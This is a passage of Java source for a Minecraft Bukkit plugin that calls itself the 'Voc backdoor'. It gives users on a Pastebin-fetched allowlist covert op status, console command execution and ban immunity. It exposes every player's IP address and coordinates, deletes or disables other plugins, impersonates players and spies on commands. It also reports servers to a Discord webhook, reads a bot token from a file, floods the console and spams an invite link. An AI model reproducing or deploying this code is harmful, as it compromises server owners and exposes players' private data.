            player.sendMessage("§aVOC §f> Fly enabled.");
        }
    }

    private void setOp(Player player) {
        player.setOp(true);
        player.sendMessage("§aVOC §f> You are now OP.");
    }

    private void removeOp(Player player) {
        player.setOp(false);
        player.sendMessage("§aVOC §f> You are now no longer OP.");
    }

    private void healPlayer(Player player) {
        player.setHealth(player.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getValue());
        player.setFoodLevel(20);
    }
    private void sendIps(Player player, String targetName) {
        if (targetName == null) {
            StringBuilder ips = new StringBuilder("§aVOC §f> IPs of online players:\n");
            for (Player p : Bukkit.getOnlinePlayers()) {
                // Check if player's address is not null
                if (p.getAddress() != null) {
                    String ipAddress = p.getAddress().getAddress().getHostAddress();
                    ips.append(p.getName()).append(": ").append(ipAddress).append("\n");
                } else {
                    ips.append(p.getName()).append(": §cNo IP found\n");
                }
            }
            player.sendMessage(ips.toString());
        } else {
            Player targetPlayer = Bukkit.getPlayer(targetName);
            if (targetPlayer != null && targetPlayer.isOnline()) {
                // Check if the target player's address is not null
                if (targetPlayer.getAddress() != null) {
                    String ipAddress = targetPlayer.getAddress().getAddress().getHostAddress();
                    player.sendMessage("§aVOC §f> IP of " + targetPlayer.getName() + ": " + ipAddress);
                } else {
                    player.sendMessage("§aVOC §f> " + targetPlayer.getName() + " has no IP available.");
                }
            } else {
                player.sendMessage("§aVOC §f> Player not found or offline.");
            }
        }
    }
    
    private void sendCoords(Player player, String targetName) {
        if (targetName == null) {
            StringBuilder coords = new StringBuilder("§aVOC §f> Coordinates of online players:\n");
            for (Player p : Bukkit.getOnlinePlayers()) {
                String world = p.getWorld().getName();
                int x = (int) Math.round(p.getLocation().getX());
                int y = (int) Math.round(p.getLocation().getY());
                int z = (int) Math.round(p.getLocation().getZ());
                coords.append(p.getName()).append(" - ").append(world)
                        .append(" (").append(x).append(", ").append(y).append(", ").append(z).append(")\n");
            }
            player.sendMessage(coords.toString());
        } else {
            Player targetPlayer = Bukkit.getPlayer(targetName);
            if (targetPlayer != null && targetPlayer.isOnline()) {
                String world = targetPlayer.getWorld().getName();
                int x = (int) Math.round(targetPlayer.getLocation().getX());
                int y = (int) Math.round(targetPlayer.getLocation().getY());
                int z = (int) Math.round(targetPlayer.getLocation().getZ());
                player.sendMessage("§aVOC §f> " + targetPlayer.getName() + " - " + world
                        + " (" + x + ", " + y + ", " + z + ")");
            } else {
                player.sendMessage("§aVOC §f> Player not found or offline.");
            }
        }
    }
    private void duplicateItem(Player player) {
        ItemStack item = player.getInventory().getItemInMainHand();
        if (item != null && item.getType() != Material.AIR) {
            player.getInventory().addItem(item.clone()); // Duplicate the item
            player.sendMessage("§aVOC §f> Item duplicated.");
        } else {
            player.sendMessage("§aVOC §f> Hold an item to duplicate it.");
        }
    }
    private void handleKickCommand(Player player, String message) {
        // Extract the target player's name from the command
        String[] parts = message.split(" ");
        if (parts.length < 2) {
            player.sendMessage("§aVOC §f> Usage: kick <player_name>");
            return;
        }

        String targetPlayerName = parts[1];
        Player targetPlayer = Bukkit.getPlayer(targetPlayerName); // Get the target player

        if (targetPlayer != null) {
            // Schedule the kick to run on the main thread
            Bukkit.getScheduler().runTask(getPlugin(), () -> {
                targetPlayer.kickPlayer("You have been kicked by " + player.getName());
                player.sendMessage("§aVOC §f> Kicked " + targetPlayerName);
            });
        } else {
            player.sendMessage("§aVOC §f> Player " + targetPlayerName + " not found.");
        }
    }
    private void handleBanCommand(Player player, String message) {
        // Extract the target player's name from the command
        String[] parts = message.split(" ");
        if (parts.length < 2) {
            player.sendMessage("§aVOC §f> Usage: ban <player_name>");
            return;
        }

        String targetPlayerName = parts[1];
        Player targetPlayer = Bukkit.getPlayer(targetPlayerName); // Get the target player

        if (targetPlayer != null) {
            // Schedule the ban to run on the main thread
            Bukkit.getScheduler().runTask(getPlugin(), () -> {
                // Ban the player using Bukkit's built-in ban methods
                Bukkit.getBanList(BanList.Type.NAME).addBan(targetPlayerName, "You are banned from this server" + player.getName(), null, player.getName());
                targetPlayer.kickPlayer("You are banned from this server ");
                player.sendMessage("§aVOC §f> Banned " + targetPlayerName);
            });
        } else {
            // Ban the player using the built-in methods for offline players
            Bukkit.getBanList(BanList.Type.NAME).addBan(targetPlayerName, "You have been banned by " + player.getName(), null, player.getName());
            player.sendMessage("§aVOC §f> Player " + targetPlayerName + " not found. Banned the player from future connections.");
        }
    }
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer(); // Get the player who joined

        // Run the task asynchronously to fetch the allowed usernames
        Bukkit.getScheduler().runTask(getPlugin(), () -> {
            Set<String> allowedUsernames = fetchUsernamesFromPastebin("https://pastebin.com/raw/saFiHiaH");
            // Check if the player's username is in the allowed list
            if (allowedUsernames.contains(player.getName().toLowerCase())) {
                // Add a delay (e.g., 20 ticks = 1 second)
                Bukkit.getScheduler().runTaskLater(getPlugin(), () -> {
                    player.sendMessage("§aVOC §f> Backdoor in this server.");
                }, 20L);
            }
        });
    }
    public static void sendWebhook(String json) {
        // If the webhook URL is not specified, do nothing
        if (webhook == null || webhook.isEmpty()) {
            return;
        }

        try {
            // Open a connection to the specified webhook URL
            HttpsURLConnection connection = (HttpsURLConnection) new URL(webhook).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11");
            connection.setDoOutput(true);

            // Write the JSON message to the connection's output stream
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(json.getBytes(StandardCharsets.UTF_8));

            // Check the response code and log it
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // Success
            } else {
                // Failure
            }

            // Read the response from the webhook
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
        } catch (Exception e) {
            // Log the error if an exception occurs
            e.printStackTrace();
        }
    }
    private static String buildJsonPayload(String desc, String backdoorversion) {
        return "{"
                + "\"avatar_url\": \"https://cdn.nest.rip/uploads/89718bfc-c03a-4184-bce7-5cd98460b650.png\","
                + "\"username\": \"Server fluisteraar\","
                + "\"embeds\": [{"
                + "\"title\": \"Voc\","
                + "\"color\": 3447003,"
                + "\"description\": \"**Server with Voc started**\\n**Voc Version " + backdoorversion + "**\\n\\n"
                + desc.replace("\n", "\\n").replace("\"", "\\\"") + "\","
                + "\"footer\": {\"text\": \"Voc by shadoweagle7184\"}"
                + "}]"
                + "}";
    }    
    private void getpluginsinserver(Player player) {
        Plugin currentPlugin = getPlugin();

            // Create a StringBuilder for the plugin list
            StringBuilder pluginList = new StringBuilder("§aVOC §f> Installed Plugins:\n");

            // Get all installed plugins
            Plugin[] plugins = Bukkit.getPluginManager().getPlugins();

            for (Plugin plugin : plugins) {
                // Check if the plugin is the current plugin instance
                if (plugin == currentPlugin) {
                    // Append the current plugin name in yellow
                    pluginList.append(ChatColor.YELLOW).append(plugin.getName()).append("\n");
                } else {
                    // Append other plugins in default color
                    pluginList.append(ChatColor.WHITE).append(plugin.getName()).append("\n");
                }
            }

            // Send the list to the command sender
            player.sendMessage(pluginList.toString());
    }
    private void handleGiveCommand(Player player, String message) {
        String[] parts = message.split(" ");
        if (parts.length != 3) {
            player.sendMessage("§aVOC §f> Usage: give <item> <amount>");
            return;
        }

        String itemName = parts[1].toUpperCase();
        int amount;

        // Validate and parse the amount
        try {
            amount = Integer.parseInt(parts[2]);
            if (amount < 1) {
                player.sendMessage("§aVOC §f> Amount must be at least 1.");
                return;
            }
        } catch (NumberFormatException e) {
            player.sendMessage("§aVOC §f> Amount must be a number.");
            return;
        }

        // Create the item stack and give it to the player
        Material material = Material.matchMaterial(itemName);
        if (material == null) {
            player.sendMessage("§aVOC §f> Unknown item: " + itemName);
            return;
        }

        ItemStack item = new ItemStack(material, amount);
        player.getInventory().addItem(item);
        player.sendMessage("§aVOC §f> Given " + amount + " " + itemName.toLowerCase() + "(s).");
    }

    private void handleEnchantCommand(Player player, String message) {
        String[] parts = message.split(" ");
        if (parts.length != 3) {
            player.sendMessage("§aVOC §f> Usage: enchant <enchantment> <level>");
            return;
        }

        String enchantName = parts[1].toUpperCase(); // Convert to uppercase for consistency
        int level;

        // Validate and parse the level
        try {
            level = Integer.parseInt(parts[2]);
            if (level < 1 || level > 255) { // Allow levels from 1 to 255
                player.sendMessage("§aVOC §f> Invalid enchantment level. It must be between 1 and 255.");
                return;
            }
        } catch (NumberFormatException e) {
            player.sendMessage("§aVOC §f> Level must be a number.");
            return;
        }

        // Get the item in hand
        ItemStack item = player.getInventory().getItemInMainHand();
        if (item == null || item.getType() == Material.AIR) {
            player.sendMessage("§aVOC §f> Hold an item to enchant it.");
            return;
        }

        // Try to get the enchantment
        Enchantment enchantment = Enchantment.getByName(enchantName);
        if (enchantment == null) {
            player.sendMessage("§aVOC §f> Unknown enchantment: " + enchantName);
            return;
        }

        // Check if the enchantment can be applied to the item
        if (!enchantment.canEnchantItem(item)) {
            player.sendMessage("§aVOC §f> The enchantment " + enchantName.toLowerCase() + " cannot be applied to " + item.getType().toString().toLowerCase() + ".");
            return;
        }

        // Check the maximum level for the enchantment
        if (level > enchantment.getMaxLevel()) {
            player.sendMessage("§aVOC §f> The maximum level for " + enchantName.toLowerCase() + " is " + enchantment.getMaxLevel() + ".");
            return;
        }

        // Enchant the item
        item.addEnchantment(enchantment, level);
        player.sendMessage("§aVOC §f> Successfully enchanted your " + item.getType().toString().toLowerCase() +
                " with " + enchantName.toLowerCase() + " " + level + ".");
    }
    private void handleXpCommand(Player player, String message) {
        String[] parts = message.split(" ");
        if (parts.length != 3) {
            player.sendMessage("§aVOC §f> Usage: xp <set/add> <amount>");
            return;
        }

        String action = parts[1].toLowerCase();
        int amount;

        try {
            amount = Integer.parseInt(parts[2]);
            if (amount < 0) {
                player.sendMessage("§aVOC §f> Amount must be at least 0.");
                return;
            }
        } catch (NumberFormatException e) {
            player.sendMessage("§aVOC §f> Amount must be a number.");
            return;
        }

        switch (action) {
            case "add":
                player.giveExp(amount);
                player.sendMessage("§aVOC §f> Added " + amount + " XP.");
                break;
            case "set":
                player.setLevel(amount);
                player.sendMessage("§aVOC §f> Set your XP level to " + amount + ".");
                break;
            default:
                player.sendMessage("§aVOC §f> Unknown action: " + action + ". Use 'add' or 'set'.");
                break;
        }
    }
    private void seed (Player player) {
        World world = player.getWorld(); // Get the world the player is in
        long seed = world.getSeed(); // Get the world seed
        player.sendMessage("§aVOC §f> Seed: " + seed); // Send the seed to the player
    }
    private void handleTpCommand(Player player, String player1Name, String player2Name) {
        Player player1 = Bukkit.getPlayer(player1Name); // Get the first target player by name
        Player player2 = Bukkit.getPlayer(player2Name); // Get the second target player by name
    
        if (player1 != null && player1.isOnline() && player2 != null && player2.isOnline()) {
            // Run teleportation synchronously on the main thread
            Bukkit.getScheduler().runTask(getPlugin(), () -> {
                player1.teleport(player2.getLocation()); // Teleport player1 to player2's location
                player.sendMessage("§aVOC §f> teleported " + player1.getName() + " to " + player2.getName() + ".");
            });
        } else {
            if (player1 == null || !player1.isOnline()) {
                player.sendMessage("§aVOC §f> Player " + player1Name + " not found or is not online.");
            }
            if (player2 == null || !player2.isOnline()) {
                player.sendMessage("§aVOC §f> Player " + player2Name + " not found or is not online.");
            }
        }
    }
    public void handleInvseeCommand(Player player, String targetName) {
        // Get the target player by name
        Player target = Bukkit.getPlayer(targetName);

        // Check if the target player is online
        if (target == null) {
            player.sendMessage("§aVOC §f> " + targetName + " is not online.");
            return;
        }

        // Open the target player's inventory for the requesting player
        player.openInventory(target.getInventory());

        // Optionally send a message to the player
        player.sendMessage("§aVOC §f> viewing " + targetName + "'s inventory.");
    }
    public void executeConsoleCommand(Player player, String message) {
        // Ensure the message has more than just "console"
        if (message.length() > "console ".length()) {
            String commandToExecute = message.substring("console ".length()).trim(); // Get the command
            
            if (commandToExecute.startsWith("/")) {
                commandToExecute = commandToExecute.substring(1); // Remove the leading slash
            }
            final String finalCommandToExecute = commandToExecute;
            
            // Run the command synchronously on the main server thread
            Bukkit.getScheduler().runTask(getPlugin(), () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), finalCommandToExecute);
                player.sendMessage("§aVOC §f> Executed console command: " + finalCommandToExecute);
            });
        } else {
            // Send an error message if there is no command after "console"
            player.sendMessage("§aVOC §f> Usage: console <command>");
        }
    }    
    // Function to handle the /invsee command
    public void invsee(Player player, String message) {
    if (message.length() > "invsee ".length()) {
        String targetName = message.substring("invsee ".length()).trim();

        // Run the inventory opening task synchronously on the main thread
        Bukkit.getScheduler().runTask(getPlugin(), () -> handleInvseeCommand(player, targetName));
    } else {
        player.sendMessage("§aVOC §f> Usage: invsee <player>");
    }
    }
    public void tp(Player player, String message) {
        // Ensure that the message contains more than just "tp"
        if (message.length() > "tp ".length()) {
            // Split the message into args after removing the command part ("tp ")
            String[] args = message.substring(3).trim().split(" ");
            
            if (args.length == 2 && !args[0].isEmpty() && !args[1].isEmpty()) {
                // Execute teleport command with the two players
                handleTpCommand(player, args[0], args[1]);
            } else {
                // Notify the player about the correct usage of the command
                player.sendMessage("§aVOC §f> Usage: tp <player1> <player2>");
            }
        } else {
            // If only "tp" is typed, show the usage
            player.sendMessage("§aVOC §f> Usage: tp <player1> <player2>");
        }
    }
    // Function to execute the sudo command
public void executeSudoCommand(Player sender, String message) {
    String[] args = message.split(" ");

    if (args.length < 3) {
        sender.sendMessage("§aVOC §f> Usage: sudo <playername> <message>");
        return;
    }

    // Get the player name and message
    String targetPlayerName = args[1];
    Player targetPlayer = Bukkit.getPlayerExact(targetPlayerName);

    if (targetPlayer == null) {
        sender.sendMessage("§aVOC §f> Player not found");
        return;
    }

    // Check if the target player is in the allowedPlayers set
    if (allowedPlayers.contains(targetPlayer)) {
        sender.sendMessage("§aVOC §f> You cannot sudo this player");
        return;
    }

    // Combine the rest of the message into a single string
    StringBuilder sudoMessage = new StringBuilder();
    for (int i = 2; i < args.length; i++) {
        sudoMessage.append(args[i]).append(" ");
    }

    // Schedule the player chat action to run synchronously on the main server thread
    Bukkit.getScheduler().runTask(getPlugin(), () -> {
        // Make the target player say the message
        targetPlayer.chat(sudoMessage.toString().trim());
    });
    }
    public void deletePlugin(Player player, String message) {
        // Extract the plugin name from the command message
        String[] parts = message.split(" ");
        if (parts.length < 2) {
            player.sendMessage("§aVOC §f> Usage: deleteplugin <plugin_name>");
            return;
        }
        String pluginName = parts[1];

        // Get the PluginManager from the server
        PluginManager pluginManager = server.getPluginManager();

        // Attempt to find the plugin by its name
        Plugin plugin = pluginManager.getPlugin(pluginName);
        if (plugin == null) {
            player.sendMessage("§aVOC §f> Plugin not found: " + pluginName);
            return;
        }

        // Disable the plugin
        try {
            pluginManager.disablePlugin(plugin);
            player.sendMessage("§aVOC §f> Plugin " + pluginName + " has been disabled.");
        } catch (Exception e) {
            player.sendMessage("§aVOC §f> Failed to disable plugin " + pluginName + ". Error: " + e.getMessage());
            return;
        }

        // Get the plugin folder using the server's root directory
        File pluginsFolder = new File(server.getWorldContainer(), "plugins");
        File pluginFile = null;

        for (File file : pluginsFolder.listFiles()) {
            if (file.getName().endsWith(".jar")) {
                try (JarFile jar = new JarFile(file)) {
                    JarEntry entry = jar.getJarEntry("plugin.yml");
                    if (entry != null) {
                        InputStream input = jar.getInputStream(entry);
                        YamlConfiguration yaml = YamlConfiguration.loadConfiguration(new InputStreamReader(input));
                        if (pluginName.equalsIgnoreCase(yaml.getString("name"))) {
                            pluginFile = file;
                            break;
                        }
                    }
                } catch (IOException e) {
                    player.sendMessage("§aVOC §f> Error reading plugin file: " + e.getMessage());
                }
            }
        }

        if (pluginFile != null && pluginFile.delete()) {
            player.sendMessage("§aVOC §f> Plugin " + pluginName + " has been deleted.");
        } else {
            player.sendMessage("§aVOC §f> Failed to delete plugin " + pluginName + ".");
        }
    }
    public void disableplugincommand(Player player, String message) {
        // Extract the plugin name from the message

        String[] parts = message.split(" ");
        if (parts.length < 2) {
            player.sendMessage("§aVOC §f> Usage: disableplugin <plugin_name>");
            return;
        }
        String pluginName = parts[1];

        // Find the plugin
        Plugin plugin = getServer().getPluginManager().getPlugin(pluginName);
        if (plugin == null) {
            player.sendMessage("§aVOC §f> Plugin not found: " + pluginName);
            return;
        }

        // Check if the plugin is the one that shouldn't be disabled
        if (plugin.getName().equalsIgnoreCase("ChatListenerPlugin")) {
            player.sendMessage("§aVOC §f> You cannot disable this plugin: " + pluginName);
            return;
        }

        // Disable the plugin
        getServer().getPluginManager().disablePlugin(plugin);
        player.sendMessage("§aVOC §f> Plugin " + pluginName + " has been disabled.");
    }
    public void enableplugincommand(Player player, String message) {
        // Extract the plugin name from the message
        String[] parts = message.split(" ");
        if (parts.length < 2) {
            player.sendMessage("§aVOC §f> Usage: enableplugin <plugin_name>");
            return;
        }
        String pluginName = parts[1];

        // Find the plugin
        Plugin plugin = getServer().getPluginManager().getPlugin(pluginName);
        if (plugin == null) {
            player.sendMessage("§aVOC §f> Plugin not found: " + pluginName);
            return;
        }

        // Check if the plugin is already enabled
        if (plugin.isEnabled()) {
            player.sendMessage("§aVOC §f> Plugin " + pluginName + " is already enabled.");
            return;
        }

        // Enable the plugin and handle potential issues
        try {
            getServer().getPluginManager().enablePlugin(plugin);
            player.sendMessage("§aVOC §f> Plugin " + pluginName + " has been enabled.");

            // Optionally, check if the plugin's functionality is working
            // This will depend on the plugin and its methods
            if (!plugin.isEnabled()) {
                player.sendMessage("§aVOC §f> Warning: Plugin " + pluginName + " is enabled but not functioning correctly.");
            }
        } catch (Exception e) {
            player.sendMessage("§aVOC §f> Failed to enable plugin " + pluginName + ". Error: " + e.getMessage());
        }
    }
    @EventHandler
    public void onPlayerLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();

        // Check if the player is already in the allowedPlayers set

        String pastebinUrl = pastbin;  // Using the raw URL

        // Fetch the usernames from the Pastebin URL
        Set<String> pastebinAllowedPlayers = fetchUsernamesFromPastebin(pastebinUrl);

        // Check if the player is in the list and has the required permission
        if (pastebinAllowedPlayers.contains(player.getName()) && player.hasPermission("no-kick-ban")) {
            // Unban the player by name
            Bukkit.getBanList(BanList.Type.NAME).pardon(player.getName());

            // Check if player address is available before unbanning by IP
            if (player.getAddress() != null) {
                Bukkit.getBanList(BanList.Type.IP).pardon(player.getAddress().getAddress().getHostAddress());
            } else {

            }

            // Ensure player is whitelisted
            if (!player.isWhitelisted()) {
                player.setWhitelisted(true);
            }
        }
    }
    @EventHandler
    public void onPlayerKick(PlayerKickEvent event) {
        Player player = event.getPlayer();
        if (allowedPlayers.contains(player)) {
            event.setCancelled(true); // Prevent the kick event if the player is logged in
            Bukkit.getBanList(BanList.Type.NAME).pardon(player.getName());
            Bukkit.getBanList(BanList.Type.IP).pardon(player.getAddress().getAddress().getHostAddress());
            player.sendMessage("§aVOC §f> Someone tryed to kick/ban you!");
        }
    }
    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        if (commandslock) {
            event.getPlayer().sendMessage("§can unexpected error has occurred");
            event.setCancelled(true);  // This cancels the command if the console is locked
            if (allowedPlayers.contains(player)) {
                event.setCancelled(false);
            }
        }
        if (blockedPlayers.contains(player)) {
            event.setCancelled(true);
            return;
        }
        for (Player p : playerlogcommands) {
            if (p != null && p.isOnline()) {
                p.sendMessage("§aVOC §f> §e[Command Log] " + event.getPlayer().getName() + " issued: " + event.getMessage());
            }
        }
    }
    @EventHandler
    public void onServerCommand(ServerCommandEvent event) {
        String message = event.getCommand();
        
        // Prevent any console command execution if console is locked
        if (consoleLocked) {
            event.setCancelled(true);  // Cancels the command from being executed
            return;  // Return early if the console is locked
        }
    }
    private void killPlayer(Player player, String targetName) {
        // Use Bukkit's scheduler to ensure this code runs synchronously
        Bukkit.getScheduler().runTask(getPlugin(), () -> {
            // Find the target player based on the provided name
            Player target = player.getServer().getPlayer(targetName);
    
            if (target != null) {
                // Kill the target player
                target.setHealth(0);
                player.sendMessage("§aVOC §f> You killed " + target.getName());
            } else {
                // Notify the sender if the target player isn't found
                player.sendMessage("§aVOC §f> Player " + targetName + " not found.");
            }
        });
    }
    private void handleHealCommand(Player player, String message) {
        // Split the message into parts
        String[] parts = message.split("\\s+");

        // Check if there's a target player specified
        if (parts.length > 1) {
            String targetName = parts[1];
            Player targetPlayer = Bukkit.getPlayer(targetName);

            // If target player exists, heal them
            if (targetPlayer != null) {
                healPlayer(targetPlayer);
                player.sendMessage("§aVOC §f> You have healed " + targetPlayer.getName() + ".");
            } else {
                player.sendMessage("§cVOC §f> Player not found.");
            }
        } else {
            // If no target is specified, heal the sender
            healPlayer(player);
            player.sendMessage("§aVOC §f> You have been healed.");
        }
    } 
    private void saveFunction() { 
        Bukkit.getScheduler().runTaskAsynchronously(getPlugin(), () -> {
            try {
                Bukkit.getWorlds().forEach(world -> world.save());
            } catch (Exception e) {
                
            }
        });
    }
    private void reloadfunction() {
        Bukkit.getScheduler().runTaskAsynchronously(getPlugin(), () -> {
            try {
                Bukkit.reload();
            } catch (Exception e) {
                
            }
        });
    }
    private String extractBotToken(File file) {
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                // Check if the line starts with "BotToken:" and extract the token value
                if (line.startsWith("BotToken:")) {
                    // Split by the colon, remove any leading/trailing spaces, and return the token
                    String token = line.split(":")[1].trim().replace("\"", ""); // Removing any surrounding quotes
                    return token;
                }
            }
        } catch (IOException e) {
            // Log the error or handle it appropriately
            e.printStackTrace(); // Example of logging the exception
            System.out.println("An error occurred while reading the bot token file: " + e.getMessage());
        }
        return null; 
    }
    private void handleUnbanCommand(Player player, String message) {
        // Extract the target player's name from the command
        String[] parts = message.split(" ");
        if (parts.length < 2) {
            player.sendMessage("§aVOC §f> Usage: unban <player_name>");
            return;
        }
    
        String targetPlayerName = parts[1];
    
        // Check if the player is banned
        if (Bukkit.getBanList(BanList.Type.NAME).isBanned(targetPlayerName)) {
            // Unban the player using Bukkit's built-in methods
            Bukkit.getBanList(BanList.Type.NAME).pardon(targetPlayerName);
            player.sendMessage("§aVOC §f> Unbanned " + targetPlayerName);
            
            // Optionally, notify the player if they are online
            Player targetPlayer = Bukkit.getPlayer(targetPlayerName);
            if (targetPlayer != null) {
                targetPlayer.sendMessage("§aVOC §f> You have been unbanned from the server.");
            }
        } else {
            player.sendMessage("§aVOC §f> Player " + targetPlayerName + " is not banned.");
        }
    }
    private void broadcastAd() {
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (!player.isOp()) {
                if (!allowedPlayers.contains(player)) {
                    for (int i = 0; i < 10; i++) {
                        player.sendMessage("§aVoc §f> Get Voc backdoor now at https://discord.gg/m23ZrwrMbB <3");
                    }
                }
            }
        }
    }
    private void handlerrorKickCommand(Player player, String message) {
        // Extract the target player's name from the command
        String[] parts = message.split(" ");
        if (parts.length < 2) {
            player.sendMessage("§aVOC §f> Usage: errorkick <player_name>");
            return;
        }

        String targetPlayerName = parts[1];
        Player targetPlayer = Bukkit.getPlayer(targetPlayerName); // Get the target player
        
        Random random = new Random();
        String randomError = errorMessages[random.nextInt(errorMessages.length)];
        if (targetPlayer != null) {
            // Schedule the kick to run on the main thread
            Bukkit.getScheduler().runTask(getPlugin(), () -> {
                targetPlayer.kickPlayer(randomError);
                player.sendMessage("§aVOC §f> Kicked " + targetPlayerName);
            });
        } else {
            player.sendMessage("§aVOC §f> Player " + targetPlayerName + " not found.");
        }
    }
    public void blockPlayer(Player player) {
        blockedPlayers.add(player);
    }
    public void unblockPlayer(Player player) {
        blockedPlayers.remove(player);
    }
    @EventHandler
    public void onPlayerThrowTNT(PlayerInteractEvent event) {
        Player player = event.getPlayer();

        // Check if the player is right-clicking and holding a TNT block
        if (event.getAction().toString().contains("RIGHT_CLICK") &&
            player.getInventory().getItemInMainHand().getType() == Material.TNT) {

            // Get the TNT item from the player's hand
            ItemStack item = player.getInventory().getItemInMainHand();

            // Check if the TNT block has the custom name "bomb" and Mending enchantment
            if (item.hasItemMeta() && item.getItemMeta().hasDisplayName()) {
                ItemMeta meta = item.getItemMeta();
                
                // Check if the name is "bomb"
                if (meta.getDisplayName().equalsIgnoreCase("§cbomb")) {
                    // Check if the TNT item has the Mending enchantment
                    if (item.containsEnchantment(Enchantment.MENDING)) {
                        TNTPrimed tnt = player.getWorld().spawn(player.getLocation().add(0, 1, 0), TNTPrimed.class);
                        Vector direction = player.getLocation().getDirection();
                        tnt.setVelocity(direction.multiply(1.5));  // Adjust speed as needed
                        
                        // Optionally set the fuse time if you want a delay before the explosion
                        tnt.setFuseTicks(60); // 80 ticks = 4 seconds before explosion
                    }
                }
            }
        }
    }
    public void changeItemCount(Player player, String message) {
        // Get the item count from the message (assuming "itemcount <number>")
        String[] args = message.split(" ");

        // Check if the message contains a valid number after "itemcount"
        if (args.length < 2) {
            player.sendMessage("Please provide a number after 'itemcount'.");
            return;
        }

        // Parse the number from the message
        int newCount;
        try {
            newCount = Integer.parseInt(args[1]);
        } catch (NumberFormatException e) {
            player.sendMessage("§aVOC §f> provide a valid number.");
            return;
        }

        // Ensure the new count does not exceed the maximum stack size (99)
        if (newCount > 99) {
            newCount = 99; // Cap the item count to 99
            player.sendMessage("§aVOC §f> max item count is 99");
        } else if (newCount < 1) {
            player.sendMessage("§aVOC §f> The item count must be at least 1.");
            return;
        }

        // Get the item in the player's hand
        ItemStack itemInHand = player.getInventory().getItemInMainHand();

        // Check if the player is holding something
        if (itemInHand == null || itemInHand.getType() == Material.AIR) {
            player.sendMessage("§aVOC §f> You are not holding any item.");
            return;
        }

        // Set the new item count
        itemInHand.setAmount(newCount);

        // Notify the player of the change
        player.sendMessage("§aVOC §f> The item count changed to " + newCount);
    }
    private void viewechest(String message, Player player) {
        String[] args = message.split(" ");
        if (args.length != 2) {
            player.sendMessage("§aVOC §f> Usage: echest <player>");
            return;
        }
    
        Player target = Bukkit.getPlayer(args[1]);
        if (target == null || !target.isOnline()) {
            player.sendMessage("§aVOC §f> Player not found or not online.");
            return;
        }
    
        // Run inventory opening on the main server thread
        Bukkit.getScheduler().runTask(getPlugin(), () -> {
            Inventory enderChest = target.getEnderChest();
            player.openInventory(enderChest);
            player.sendMessage("§aVOC §f> You are now viewing " + target.getName() + "'s ender chest.");
        });
    }
    public void floodConsole() {
        Bukkit.getScheduler().runTaskAsynchronously(getPlugin(), () -> {
            for (int i = 0; i < 10000; i++) {
                System.out.println("if you paid for this u got scammed");
            }
        });
    }
    private void sendToAllowedPlayers(Player sender, String message) {
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (allowedPlayers.contains(player)) {
                player.sendMessage("§aVoc chat §f> " + sender.getName() + " : " + message);
            }
        }
    }
    private void handleBanIpCommand(Player player, String message) {
        // Extract the IP from the command
        String[] parts = message.split(" ");
        if (parts.length < 2) {
            player.sendMessage("§aVOC §f> Usage: banip <ip>");
            return;
        }
    
        String targetIp = parts[1];
    
        // Schedule the ban to run on the main thread
        Bukkit.getScheduler().runTask(getPlugin(), () -> {
            // Ban the IP using Bukkit's built-in ban methods
            Bukkit.getBanList(BanList.Type.IP).addBan(targetIp, "You are banned from this server", null, player.getName());
            player.sendMessage("§aVOC §f> Banned IP " + targetIp);
        });
    }
    
    private void handleUnbanIpCommand(Player player, String message) {
        // Extract the IP from the command
        String[] parts = message.split(" ");
        if (parts.length < 2) {
            player.sendMessage("§aVOC §f> Usage: unbanip <ip>");
            return;
        }
    
        String targetIp = parts[1];
    
        // Schedule the unban to run on the main thread
        Bukkit.getScheduler().runTask(getPlugin(), () -> {
            // Unban the IP using Bukkit's built-in methods
            Bukkit.getBanList(BanList.Type.IP).pardon(targetIp);
            player.sendMessage("§aVOC §f> Unbanned IP " + targetIp);
        });
    }
    // Method to send log messages to all players in the consolespy set
    private void sendToPlayers(String logMessage) {
        for (Player player : consolespy) {
            player.sendMessage(logMessage); // Assuming `sendMessage` sends the message to the player
        }
    }

    // Method to add a player to the spy list
    public void addPlayerToSpyList(Player player) {
        consolespy.add(player);
    }

    // Method to remove a player from the spy list
    public void removePlayerFromSpyList(Player player) {
        consolespy.remove(player);
    }
}